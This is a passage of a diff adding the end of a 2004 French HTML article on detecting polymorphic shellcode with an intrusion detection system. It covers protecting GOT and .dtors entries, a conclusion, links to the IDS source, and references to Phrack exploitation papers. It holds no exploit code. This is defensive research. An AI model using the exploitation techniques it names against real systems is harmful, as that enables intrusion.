+  utile de s'int&eacute;resser de pr&egrave;s &agrave; la protection des adresses 
+  de la <em>got</em> et de <em>.dtors</em>, puisque ce sont les deux principales 
+  m&eacute;thodes qui permettent de prendre le contr&ocirc;le d'une machine avec 
+  cette faille (en plus de l'&eacute;crasement de l'<em>adresse de retour</em>, 
+  mais notre technique bloque d&eacute;j&agrave; cette exploitation). </font></p>
+<p align="left"><font size="2"><br>
+  </font></p>
+<p align="left">&nbsp;</p>
+<p align="left"><font size="2"><strong><u><br><a name="6"></a>6) Conclusion </u></strong></font></p>
+<p align="left"><font size="4">C</font><font size="2">omme nous l'avons vu, il 
+  est toujours possible de pouvoir d&eacute;tecter un <em>shellcode poymorphique</em>, 
+  aussi sophistiqu&eacute; et invisible soit-il. Cependant, le g&eacute;n&eacute;rateur 
+  de <em>shellcodes polymorphiques</em> est vraiment excellent au niveau de sa 
+  conception. Je suis s&ucirc;r qu'il doit y avoir des m&eacute;thodes plus fines 
+  permettant de d&eacute;tecter ce genre de <em>shellcodes</em>. Cependant, les 
+  techniques permettant de cr&eacute;er des <em>shellcodes polymorphiques</em> 
+  sont, pour la plupart, rest&eacute;es privees. Ainsi, il est tr&egrave;s difficile 
+  de pouvoir b&acirc;tir un d&eacute;tecteur solide et impeccable du premier coup 
+  quand on ne connait pas les techniques utilisees de l'autre c&ocirc;t&eacute;.<br>
+  <br>
+  <font size="4">L</font>a guerre <em>shellcodes</em> vs <em>IDS</em> n'est donc 
+  pas finie :)</font></p>
+<p align="left"></p>
+<p align="left"><font size="2"><br>
+  <u>Greetz to</u> : z33w, etherlord, edcba, fool, CocaCola. </font></p><br><br><br><br><br><br><br>
+<p align="left"></p>
+<p align="left"><font size="2"><strong><u><a name="7"></a>7) Codes Source</u></strong></font></p>
+<table width="60%" border="1" align="center" bordercolor="#F8F8F8">
+  <tr>
+    <td bordercolor="#000000" bgcolor="#FFFFFF"> 
+      <div align="center"><font size="2"><a href="ids_header.c.txt" target="_blank">ids_header.c 
+        for IDPS</a></font></div></td>
+  </tr>
+  <tr>
+    <td bordercolor="#000000" bgcolor="#FFFFFF"> 
+      <div align="center"><font size="2"><a href="ids_source.c.txt" target="_blank">ids_source.c 
+        for IDPS</a></font><br>
+      </div></td>
+  </tr>
+</table>
+<p align="left">&nbsp;</p>
+<p align="left">&nbsp;</p>
+<p align="left">&nbsp;</p>
+<p align="left"><font size="2"><strong><u><br><a name="8" id="8"></a>8) R&eacute;f&eacute;rences</u></strong></font></p>
+<p align="left"><font size="2"><br>
+  -----------------------------------------------------------------------------------<br>
+  <font color="#FF0000">[1]</font> Sinan &quot;noir&quot; eren &quot;Smashing 
+  the Kernel Stack for Fun And Profit&quot;, Phrack #60-0x06 <br>
+  <font color="#FF0000">[2]</font> Aleph1 &quot;Smashing the Stack For Fun And 
+  Profit&quot;, Phrack #49-0x0e <br>
+  <font color="#FF0000">[3]</font> rix &quot;Writing ia32 alphanumeric shellcodes&quot;, 
+  Phrack 54-0x0f <br>
+  <font color="#FF0000">[4]</font> Intel Corp &quot;Intel architecture Software 
+  Developer's Manuel&quot; (vol.1-3) <br>
+  <font color="#FF0000">[5]</font> ADMmutate // http://adm.freelsd.net <br>
+  <font color="#FF0000">[6]</font> Nocte &quot;Fun and Games with evoluates shellcodes&quot;, 
+  TDC Mag n&deg;4 <br>
+  <font color="#FF0000">[7]</font> rtc team &quot;Polymorphic Shellcode Engin 
+  using spectrum analysis&quot;, Phrack &quot;61-0x07 <br>
+  -----------------------------------------------------------------------------------<br>
+  </font></p>
+<p align="left">&nbsp;</p>
+<p align="right"><font size="2"><em><font size="3" face="Lucida Console"> NOCTE</font></em></font></p>
+<p align="right"><font size="1">Copyright &copy; 2004 ARENHACK - DHS</font></p>
+<p align="center"><font size="1" face="Verdana, Arial, Helvetica, sans-serif"><a href="ids.htm"><u>HAUT 
+  DE PAGE</u></a></font><font size="2"><br>
+  </font></p>
+</body>
+</html>
